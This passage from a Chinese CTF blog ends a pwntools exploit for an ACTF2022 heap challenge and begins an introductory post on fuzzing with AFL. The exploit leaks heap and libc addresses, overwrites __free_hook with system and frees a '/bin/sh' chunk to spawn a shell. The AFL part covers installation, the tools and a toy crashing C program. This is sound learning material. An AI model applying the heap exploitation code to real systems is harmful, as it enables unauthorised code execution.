class="keyword">if</span> <span class="string">&#x27;totally 0 elements&#x27;</span> <span class="keyword">in</span> data0:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&#x27;\x55&#x27;</span> <span class="keyword">in</span> data0:</span><br><span class="line">                f.write(<span class="string">&#x27;query(&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;)\n&#x27;</span>.<span class="built_in">format</span>(a,b,c,d))</span><br><span class="line">                success(<span class="string">&#x27;query(&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;)\n&#x27;</span>.<span class="built_in">format</span>(a,b,c,d))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&#x27;\x56&#x27;</span> <span class="keyword">in</span> data0:</span><br><span class="line">                f.write(<span class="string">&#x27;query(&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;)\n&#x27;</span>.<span class="built_in">format</span>(a,b,c,d))</span><br><span class="line">                success(<span class="string">&#x27;query(&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;)\n&#x27;</span>.<span class="built_in">format</span>(a,b,c,d))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    add(<span class="number">1</span>,<span class="number">5</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">    add(<span class="number">7</span>,<span class="number">6</span>,<span class="built_in">str</span>(<span class="number">10</span>))</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">8</span>,<span class="built_in">str</span>(<span class="number">20</span>))</span><br><span class="line">    add(<span class="number">5</span>,<span class="number">5</span>,<span class="built_in">str</span>(<span class="number">30</span>))</span><br><span class="line">    add(<span class="number">5</span>,<span class="number">1</span>,<span class="built_in">str</span>(<span class="number">40</span>))</span><br><span class="line">    add(<span class="number">7</span>,<span class="number">6</span>,<span class="built_in">str</span>(<span class="number">50</span>))</span><br><span class="line">    add(<span class="number">6</span>,<span class="number">6</span>,<span class="built_in">str</span>(<span class="number">60</span>))</span><br><span class="line">    dele(<span class="number">7</span>,<span class="number">6</span>)</span><br><span class="line">    add(<span class="number">7</span>,<span class="number">3</span>,<span class="built_in">str</span>(<span class="number">70</span>))</span><br><span class="line">    add(<span class="number">6</span>,<span class="number">8</span>,<span class="built_in">str</span>(<span class="number">80</span>))</span><br><span class="line">    add(<span class="number">8</span>,<span class="number">0</span>,<span class="built_in">str</span>(<span class="number">90</span>))</span><br><span class="line">    dele(<span class="number">5</span>,<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">3</span>,<span class="number">5</span>,<span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line">    dele(<span class="number">1</span>,<span class="number">5</span>)</span><br><span class="line">    add(<span class="number">5</span>,<span class="number">0</span>,<span class="built_in">str</span>(<span class="number">110</span>))</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">1</span>,<span class="built_in">str</span>(<span class="number">120</span>))</span><br><span class="line">    add(<span class="number">5</span>,<span class="number">3</span>,<span class="built_in">str</span>(<span class="number">130</span>))</span><br><span class="line">    dele(<span class="number">3</span>,<span class="number">5</span>)</span><br><span class="line">    add(<span class="number">6</span>,<span class="number">3</span>,<span class="built_in">str</span>(<span class="number">140</span>))</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">5</span>,<span class="built_in">str</span>(<span class="number">150</span>))</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0</span>,<span class="built_in">str</span>(<span class="number">160</span>))</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">6</span>,<span class="built_in">str</span>(<span class="number">170</span>))</span><br><span class="line">    dele(<span class="number">5</span>,<span class="number">5</span>)</span><br><span class="line">    add(<span class="number">8</span>,<span class="number">2</span>,<span class="built_in">str</span>(<span class="number">180</span>))</span><br><span class="line">    dele(<span class="number">6</span>,<span class="number">6</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">2</span>,<span class="built_in">str</span>(<span class="number">190</span>))</span><br><span class="line">    dele(<span class="number">1</span>,<span class="number">6</span>)</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">5</span>,<span class="built_in">str</span>(<span class="number">200</span>))</span><br><span class="line">    dele(<span class="number">0</span>,<span class="number">8</span>)</span><br><span class="line">    add(<span class="number">4</span>,<span class="number">8</span>,<span class="built_in">str</span>(<span class="number">210</span>))</span><br><span class="line">    add(<span class="number">6</span>,<span class="number">5</span>,<span class="built_in">str</span>(<span class="number">220</span>))</span><br><span class="line">    add(<span class="number">6</span>,<span class="number">3</span>,<span class="built_in">str</span>(<span class="number">230</span>))</span><br><span class="line">    add(<span class="number">8</span>,<span class="number">2</span>,<span class="built_in">str</span>(<span class="number">240</span>))</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">4</span>,<span class="built_in">str</span>(<span class="number">250</span>))</span><br><span class="line">    add(<span class="number">7</span>,<span class="number">2</span>,<span class="built_in">str</span>(<span class="number">260</span>))</span><br><span class="line">    add(<span class="number">3</span>,<span class="number">1</span>,<span class="built_in">str</span>(<span class="number">270</span>))</span><br><span class="line">    add(<span class="number">3</span>,<span class="number">6</span>,<span class="built_in">str</span>(<span class="number">280</span>))</span><br><span class="line">    add(<span class="number">6</span>,<span class="number">2</span>,<span class="built_in">str</span>(<span class="number">290</span>))</span><br><span class="line">    dele(<span class="number">1</span>,<span class="number">4</span>)</span><br><span class="line">    add(<span class="number">4</span>,<span class="number">2</span>,<span class="built_in">str</span>(<span class="number">300</span>))</span><br><span class="line">    dele(<span class="number">0</span>,<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">1</span>,<span class="built_in">str</span>(<span class="number">310</span>))</span><br><span class="line">    dele(<span class="number">5</span>,<span class="number">3</span>)</span><br><span class="line">    add(<span class="number">4</span>,<span class="number">5</span>,<span class="built_in">str</span>(<span class="number">320</span>))</span><br><span class="line">    dele(<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">    dele(<span class="number">4</span>,<span class="number">5</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0</span>,<span class="built_in">str</span>(<span class="number">330</span>))</span><br><span class="line">    dele(<span class="number">7</span>,<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">4</span>,<span class="number">4</span>,<span class="built_in">str</span>(<span class="number">340</span>))</span><br><span class="line">    add(<span class="number">7</span>,<span class="number">8</span>,<span class="built_in">str</span>(<span class="number">350</span>))</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">4</span>,<span class="built_in">str</span>(<span class="number">360</span>))</span><br><span class="line">    dele(<span class="number">0</span>,<span class="number">4</span>)</span><br><span class="line">    dele(<span class="number">5</span>,<span class="number">0</span>)</span><br><span class="line">    <span class="comment">#add(0,0,str(370))</span></span><br><span class="line">    dele(<span class="number">6</span>,<span class="number">8</span>)</span><br><span class="line">    add(<span class="number">7</span>,<span class="number">0</span>,<span class="built_in">str</span>(<span class="number">380</span>))</span><br><span class="line">    add(<span class="number">7</span>,<span class="number">6</span>,<span class="built_in">str</span>(<span class="number">390</span>))</span><br><span class="line">    dele(<span class="number">4</span>,<span class="number">4</span>)</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0</span>,<span class="built_in">str</span>(<span class="number">400</span>))</span><br><span class="line">    dele(<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">8</span>,<span class="number">2</span>,<span class="built_in">str</span>(<span class="number">410</span>))</span><br><span class="line">    dele(<span class="number">7</span>,<span class="number">8</span>)</span><br><span class="line">    add(<span class="number">4</span>,<span class="number">5</span>,<span class="built_in">str</span>(<span class="number">420</span>))</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">6</span>,<span class="built_in">str</span>(<span class="number">430</span>))</span><br><span class="line">    dele(<span class="number">3</span>,<span class="number">1</span>)</span><br><span class="line">    dele(<span class="number">7</span>,<span class="number">6</span>)</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">7</span>,<span class="built_in">str</span>(<span class="number">440</span>))</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">8</span>,<span class="built_in">str</span>(<span class="number">450</span>))</span><br><span class="line">    dele(<span class="number">1</span>,<span class="number">6</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">7</span>,<span class="built_in">str</span>(<span class="number">460</span>))</span><br><span class="line">    add(<span class="number">7</span>,<span class="number">0</span>,<span class="built_in">str</span>(<span class="number">470</span>))</span><br><span class="line">    dele(<span class="number">1</span>,<span class="number">7</span>)</span><br><span class="line">    add(<span class="number">4</span>,<span class="number">2</span>,<span class="built_in">str</span>(<span class="number">480</span>))</span><br><span class="line">    dele(<span class="number">7</span>,<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">3</span>,<span class="number">3</span>,<span class="built_in">str</span>(<span class="number">490</span>))</span><br><span class="line">    add(<span class="number">5</span>,<span class="number">4</span>,<span class="built_in">str</span>(<span class="number">500</span>))</span><br><span class="line">    dele(<span class="number">5</span>,<span class="number">3</span>)</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">7</span>,<span class="built_in">str</span>(<span class="number">510</span>))</span><br><span class="line">    dele(<span class="number">3</span>,<span class="number">6</span>)</span><br><span class="line">    dele(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">6</span>,<span class="number">7</span>,<span class="built_in">str</span>(<span class="number">520</span>))</span><br><span class="line">    add(<span class="number">4</span>,<span class="number">1</span>,<span class="built_in">str</span>(<span class="number">530</span>))</span><br><span class="line">    dele(<span class="number">5</span>,<span class="number">4</span>)</span><br><span class="line">    dele(<span class="number">6</span>,<span class="number">7</span>)</span><br><span class="line">    add(<span class="number">7</span>,<span class="number">4</span>,<span class="built_in">str</span>(<span class="number">540</span>))</span><br><span class="line">    add(<span class="number">6</span>,<span class="number">7</span>,<span class="built_in">str</span>(<span class="number">550</span>))</span><br><span class="line">    add(<span class="number">8</span>,<span class="number">7</span>,<span class="built_in">str</span>(<span class="number">560</span>))</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">2</span>,<span class="built_in">str</span>(<span class="number">570</span>))</span><br><span class="line">    dele(<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">8</span>,<span class="number">6</span>,<span class="built_in">str</span>(<span class="number">580</span>))</span><br><span class="line">    add(<span class="number">3</span>,<span class="number">6</span>,<span class="built_in">str</span>(<span class="number">590</span>))</span><br><span class="line">    dele(<span class="number">8</span>,<span class="number">7</span>)</span><br><span class="line">    add(<span class="number">5</span>,<span class="number">1</span>,<span class="built_in">str</span>(<span class="number">600</span>))</span><br><span class="line">    dele(<span class="number">4</span>,<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">8</span>,<span class="built_in">str</span>(<span class="number">610</span>))</span><br><span class="line">    dele(<span class="number">1</span>,<span class="number">7</span>)</span><br><span class="line">    dele(<span class="number">6</span>,<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">2</span>,<span class="built_in">str</span>(<span class="number">620</span>))</span><br><span class="line">    dele(<span class="number">5</span>,<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">3</span>,<span class="number">1</span>,<span class="built_in">str</span>(<span class="number">630</span>))</span><br><span class="line">    dele(<span class="number">6</span>,<span class="number">5</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">3</span>,<span class="built_in">str</span>(<span class="number">640</span>))</span><br><span class="line">    add(<span class="number">6</span>,<span class="number">8</span>,<span class="built_in">str</span>(<span class="number">650</span>))</span><br><span class="line">    add(<span class="number">3</span>,<span class="number">6</span>,<span class="built_in">str</span>(<span class="number">660</span>))</span><br><span class="line">    dele(<span class="number">6</span>,<span class="number">8</span>)</span><br><span class="line">    <span class="comment">#dele(8,0)</span></span><br><span class="line">    <span class="comment">#add(4,2,str(670))</span></span><br><span class="line">    <span class="comment">#dele(2,2)</span></span><br><span class="line">    <span class="comment">#add(4,3,str(680))</span></span><br><span class="line">    <span class="comment">#dele(0,1)</span></span><br><span class="line">    <span class="comment">#dele(3,6)</span></span><br><span class="line">    <span class="comment">#add(4,5,str(690))</span></span><br><span class="line">    <span class="comment">#dele(4,8)</span></span><br><span class="line">    <span class="comment">#dele(4,3)</span></span><br><span class="line">    <span class="comment">#add(1,2,str(700))</span></span><br><span class="line">    <span class="comment">#dele(6,8) </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test2</span>():</span></span><br><span class="line">    add(<span class="number">5</span>,<span class="number">8</span>,<span class="string">&quot;yhellow&quot;</span>)</span><br><span class="line">    dele(<span class="number">4</span>,<span class="number">8</span>)</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">5</span>,<span class="built_in">str</span>(<span class="number">10</span>))</span><br><span class="line">    dele(<span class="number">7</span>,<span class="number">4</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0</span>,<span class="built_in">str</span>(<span class="number">20</span>))</span><br><span class="line">    dele(<span class="number">4</span>,<span class="number">5</span>)</span><br><span class="line">    add(<span class="number">5</span>,<span class="number">2</span>,<span class="built_in">str</span>(<span class="number">30</span>))</span><br><span class="line">    dele(<span class="number">6</span>,<span class="number">7</span>)</span><br><span class="line">    <span class="comment">#add(6,7,str(40))</span></span><br><span class="line">    dele(<span class="number">8</span>,<span class="number">2</span>)</span><br><span class="line">    dele(<span class="number">6</span>,<span class="number">7</span>)</span><br><span class="line">    add(<span class="number">6</span>,<span class="number">4</span>,<span class="built_in">str</span>(<span class="number">50</span>))</span><br><span class="line">    dele(<span class="number">4</span>,<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">3</span>,<span class="number">5</span>,<span class="built_in">str</span>(<span class="number">60</span>))</span><br><span class="line">    dele(<span class="number">7</span>,<span class="number">3</span>)</span><br><span class="line">    <span class="comment">#add(0,3,str(70))</span></span><br><span class="line">    <span class="comment">#add(8,7,str(80))</span></span><br><span class="line">    add(<span class="number">6</span>,<span class="number">0</span>,<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">    dele(<span class="number">5</span>,<span class="number">2</span>)</span><br><span class="line">    dele(<span class="number">8</span>,<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">4</span>,<span class="number">7</span>,<span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">3</span>,<span class="built_in">str</span>(<span class="number">110</span>))</span><br><span class="line">    dele(<span class="number">6</span>,<span class="number">4</span>)</span><br><span class="line">    dele(<span class="number">3</span>,<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">3</span>,<span class="built_in">str</span>(<span class="number">120</span>))</span><br><span class="line">    add(<span class="number">3</span>,<span class="number">1</span>,<span class="built_in">str</span>(<span class="number">130</span>))</span><br><span class="line">    dele(<span class="number">3</span>,<span class="number">5</span>)</span><br><span class="line">    dele(<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line">    <span class="comment">#add(5,5,str(140))</span></span><br><span class="line">    <span class="comment">#dele(2,2)</span></span><br><span class="line">    <span class="comment">#add(2,4,str(150))</span></span><br><span class="line">    <span class="comment">#dele(0,8)</span></span><br><span class="line">    <span class="comment">#add(8,0,str(160))</span></span><br><span class="line">    <span class="comment">#add(1,1,str(170))</span></span><br><span class="line">    <span class="comment">#dele(6,0)</span></span><br><span class="line">    <span class="comment">#add(7,0,str(180))</span></span><br><span class="line">    dele(<span class="number">1</span>,<span class="number">5</span>)</span><br><span class="line">    <span class="comment">#dele(1,5)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test3</span>():</span></span><br><span class="line">    add(<span class="number">1</span>,<span class="number">7</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">    dele(<span class="number">3</span>,<span class="number">1</span>)</span><br><span class="line">    dele(<span class="number">8</span>,<span class="number">6</span>)</span><br><span class="line">    add(<span class="number">4</span>,<span class="number">7</span>,<span class="built_in">str</span>(<span class="number">10</span>))</span><br><span class="line">    dele(<span class="number">3</span>,<span class="number">1</span>)</span><br><span class="line">    dele(<span class="number">1</span>,<span class="number">7</span>)</span><br><span class="line">    add(<span class="number">3</span>,<span class="number">8</span>,<span class="built_in">str</span>(<span class="number">20</span>))</span><br><span class="line">    dele(<span class="number">3</span>,<span class="number">6</span>)</span><br><span class="line">    dele(<span class="number">8</span>,<span class="number">2</span>)</span><br><span class="line">    <span class="comment">#dele(8,2)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&quot;b *$rebase(0x3CAD)\n&quot;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#fuzz()</span></span><br><span class="line">test()</span><br><span class="line">show(<span class="number">6</span>,<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;found!!! its name: &quot;</span>)</span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">heap_base = leak_addr-<span class="number">0x10</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line"><span class="comment">#fuzz()</span></span><br><span class="line">test2()</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">5</span>,p64(heap_base+<span class="number">0x5f0</span>-<span class="number">0x10</span>-<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>,<span class="number">7</span>,<span class="string">&quot;there&quot;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">8</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x571</span>))</span><br><span class="line">dele(<span class="number">5</span>,<span class="number">8</span>)</span><br><span class="line">show(<span class="number">5</span>,<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;found!!! its name: &quot;</span>)</span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">libc_base = leak_addr-<span class="number">0x3ebca0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_libc=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">onegadget = [<span class="number">0x4f2a5</span>,<span class="number">0x4f302</span>,<span class="number">0x10a2fc</span>]</span><br><span class="line">one_gadget = onegadget[<span class="number">2</span>]+libc_base</span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;free_hook &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">success(<span class="string">&quot;system_libc &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(system_libc))</span><br><span class="line">success(<span class="string">&quot;one_gadget &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line"></span><br><span class="line"><span class="comment">#fuzz()</span></span><br><span class="line">test3()</span><br><span class="line">edit(<span class="number">8</span>,<span class="number">2</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">7</span>,<span class="number">7</span>,<span class="string">&quot;there&quot;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">7</span>,p64(system_libc))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">6</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>先挂上这位大佬的博客：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-273516.htm#msg_header_h2_3">【ACTF2022】从Fuzz到XCTF赛题-Pwn-看雪论坛-安全社区</a></li>
</ul>
<p>真的学到了不少东西，涨见识了…</p>
<p>感觉这种 fuzz 主要是来找 UAF 的，对堆溢出可能没有什么办法，如果程序严格限制各个模块执行次数，那么这种 fuzz 就很难发挥作用了</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/26/fuzz%E5%85%A5%E9%97%A8+AFL%E7%9A%84%E4%BD%BF%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/07/26/fuzz%E5%85%A5%E9%97%A8+AFL%E7%9A%84%E4%BD%BF%E7%94%A8/" class="post-title-link" itemprop="url">fuzz入门+AFL的使用</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-07-26 11:05:59 / Modified: 11:08:52" itemprop="dateCreated datePublished" datetime="2022-07-26T11:05:59+08:00">2022-07-26</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>3.1k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>3 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>Fuzz 简述</strong></p>
<p>模糊测试（Fuzzing）是一种基于黑盒的自动化软件模糊测试技术，简单的说一种懒惰且暴力的技术融合了常见的以及精心构建的数据文本进行网站、软件安全性测试</p>
<p>好用的工具：AFL、LibFuzzer、honggfuzz</p>
<p><strong>AFL 简述</strong></p>
<p>AFL（American Fuzzy Lop）是由安全研究员 Michał Zalewski 开发的一款基于覆盖引导（Coverage-guided）的模糊测试工具</p>
<p>其工作流程大致如下： </p>
<ul>
<li>从源码编译程序时进行插桩，以记录代码覆盖率（Code Coverage）</li>
<li>选择一些输入文件，作为初始测试集加入输入队列（queue）</li>
<li>将队列中的文件按一定的策略进行“突变”</li>
<li>如果经过变异文件更新了覆盖范围，则将其保留添加到队列中</li>
<li>上述过程会一直循环进行，期间触发了 crash 的文件会被记录下来</li>
</ul>
<p><img src="/2022/07/26/fuzz%E5%85%A5%E9%97%A8+AFL%E7%9A%84%E4%BD%BF%E7%94%A8/1658796625409.png" alt="1658796625409">  </p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/191536.html">AFL漏洞挖掘技术漫谈（一）</a> </p>
<p><strong>AFL 安装</strong></p>
<p>AFL 是一种面向安全的模糊器，它采用新型的编译时检测和遗传算法来自动发现有趣的测试用例，这些用例会触发目标二进制文件中的新内部状态</p>
<p>安装 llvm 环境：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install clang llvm-dev llvm</span><br><span class="line">sudo apt-get install clang-3.4</span><br></pre></td></tr></table></figure>
<p>使用如下命令下载 AFL 安装包：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://lcamtuf.coredump.cx/afl/releases/afl-latest.tgz</span><br></pre></td></tr></table></figure>
<p>在解压后的文件中执行 <code>make</code> 进行编译，输入 <code>afl-fuzz</code> 以验证是否安装成功：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  afl-2.52b afl-fuzz</span><br><span class="line">afl-fuzz 2.52b by &lt;lcamtuf@google.com&gt;</span><br></pre></td></tr></table></figure>
<p>安装好的目录中应该有如下的文件：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  afl-2.52b ls</span><br><span class="line">afl-analyze    afl-fuzz      afl-showmap    debug.h        Makefile</span><br><span class="line">afl-analyze.c  afl-fuzz.c    afl-showmap.c  dictionaries   qemu_mode</span><br><span class="line">afl-as         afl-g++       afl-tmin       docs           QuickStartGuide.txt</span><br><span class="line">afl-as.c       afl-gcc       afl-tmin.c     experimental   README</span><br><span class="line">afl-as.h       afl-gcc.c     afl-whatsup    hash.h         testcases</span><br><span class="line">afl-clang      afl-gotcpu    alloc-inl.h    libdislocator  test-instr.c</span><br><span class="line">afl-clang++    afl-gotcpu.c  as             libtokencap    types.h</span><br><span class="line">afl-cmin       afl-plot      config.h       llvm_mode</span><br></pre></td></tr></table></figure>
<ul>
<li>afl-gcc 和 afl-g++ 分别对应的是 gcc 和 g++ 的封装</li>
<li>afl-clang 和 afl-clang++ 分别对应 clang 的 c 和 c++ 编译器封装À</li>
<li>afl-fuzz 是 AFL 的主体，用于对目标程序进行 fuzz</li>
<li>afl-analyze 可以对用例进行分析，通过分析给定的用例，看能否发现用例中有意义的字段</li>
<li>afl-qemu-trace 用于 qemu-mode，默认不安装，需要手工执行 qemu-mode 的编译脚本进行编译，后面会介绍</li>
<li>afl-plot 生成测试任务的状态图</li>
<li>afl-tmin 和 afl-cmin 对用例进行简化</li>
<li>afl-whatsup 用于查看 fuzz 任务的状态</li>
<li>afl-gotcpu 用于查看当前 CPU 状态</li>
<li>afl-showmap 用于对单个用例进行执行路径跟踪</li>
</ul>
<p><strong>AFL 使用</strong></p>
<p>AFL 需要一些初始输入数据（也叫种子文件）作为 Fuzzing 的起点，这些输入甚至可以是毫无意义的数据，AFL 可以通过启发式算法自动确定文件格式结构</p>
<p>AFL 源码中自带了一个语料库：testcases</p>
<p>测试代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">(<span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">&#x27;A&#x27;</span> &amp;&amp; len == <span class="number">66</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">&#x27;F&#x27;</span> &amp;&amp; len == <span class="number">6</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;it is good!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    